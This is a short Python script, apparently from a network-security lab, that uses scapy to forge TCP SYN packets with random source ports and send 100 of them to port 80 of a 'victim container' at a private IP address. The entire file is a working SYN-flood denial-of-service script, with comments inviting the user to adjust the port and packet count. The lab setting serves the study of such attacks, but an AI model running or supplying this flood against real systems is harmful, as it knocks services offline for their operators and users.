from scapy.all import *
target_ip = "172.17.0.3"  # IP address of the victim container

# Forge the IP packet with the target IP as the destination
ip = IP(dst=target_ip) 

#Forge the TCP layer (SYN packet)
tcp = TCP(sport=RandShort(), dport=80, flags="S")  # Port 80 (adjust as needed)

#Combine the IP and TCP layers to create the SYN packet
packet = ip / tcp

#Send the SYN packets in a loop 
num_packets = 100  # Number of SYN packets to send (adjust the count as needed)
for _ in range(num_packets):
    send(packet)
